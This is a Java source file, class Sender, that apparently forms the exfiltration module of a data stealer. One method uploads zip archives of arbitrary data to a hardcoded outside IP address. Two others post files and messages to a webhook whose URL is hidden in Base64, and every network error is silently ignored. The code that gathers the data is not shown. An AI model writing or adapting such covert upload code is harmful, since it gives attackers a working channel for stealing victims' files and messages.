package io.github.luxotick;

import io.github.luxotick.impl.yazici;
import okhttp3.*;

import java.io.File;
import java.io.IOException;

import java.util.Base64;

public class Sender {
    private static final MediaType jsonMediaType = MediaType.parse("application/json; charset=utf-8");

    public static final String a = "webhook url with base64 encrypt";



    /**
     * @param client      OkHttpClient
     * @param requestBody RequestBody
     * @throws IOException IOException
     */
    public static void sendFile(OkHttpClient client, RequestBody requestBody) throws IOException {
        byte[] decodedBytes = Base64.getDecoder().decode(a);
        String decodedStr = new String(decodedBytes);

        Request request = new Request.Builder()
                .url(decodedStr)
                .post(requestBody)
                .build();

        Response response = client.newCall(request).execute();
    }

    public static void sendToServer(byte[] zipData, String fileName) {
        OkHttpClient httpClient = new OkHttpClient();

        String server = "http://3.67.98.46:1453/dosya-yukle";

        // Create a RequestBody from the byte array
        RequestBody requestBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("dosya", fileName, RequestBody.create(zipData, MediaType.parse("application/octet-stream")))
                .build();

        Request request = new Request.Builder()
                .url(server)
                .post(requestBody)
                .build();
        try {
            Response response = httpClient.newCall(request).execute();
            yazici.main(String.valueOf(zipData));
        } catch (Exception ignored) {
        }
    }


    public static void sendMessage(String message) {
        OkHttpClient httpClient = new OkHttpClient();

        byte[] decodedBytes = Base64.getDecoder().decode(a);
        String decodedStr = new String(decodedBytes);

        String json = "{\"content\":\"" + message + "\"}";
        RequestBody body = RequestBody.create(json, jsonMediaType);
        Request request = new Request.Builder()
                .url(decodedStr)
                .post(body)
                .build();
        try {
            Response response = httpClient.newCall(request).execute();
            yazici.main(message);
        } catch (Exception ignored) {
        }
    }
}
